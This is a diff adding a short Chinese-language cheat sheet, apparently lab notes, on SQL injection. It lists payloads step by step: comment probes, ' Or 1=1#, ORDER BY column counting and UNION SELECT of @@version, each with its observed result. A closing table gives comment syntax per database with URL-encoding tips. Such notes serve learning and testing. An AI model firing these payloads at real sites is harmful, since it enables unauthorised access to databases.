@@ -1,0 +1,21 @@
+SQL 注入攻击，查询 MySQL 和 Microsoft 数据库的类型和版本:
+
+'
+'-- >> error  : 不是Oracle, PostgreSQL.
+' # >> ok  : 是mysql
+' --+ >> ok : mysql
+' Or 1=1#
+' Order by 3# >> error
+' Order by 2# >> yes : 两个字段
+' Union select null, null# >> yes
+' Union select 'a', null# >> yes 
+' Union select 'a', 'b'# >> yes : 两个有效字符串字段
+' Union select @@version, null#
+>> 成功爆出mysql数据库的类型和版本
+
+
+数据库注释：
+Oracle: --
+Microsoft: --
+PostgreSQL: --
+Mysql: # ｜ --+ (+代表url空格， #要转换为url%23)
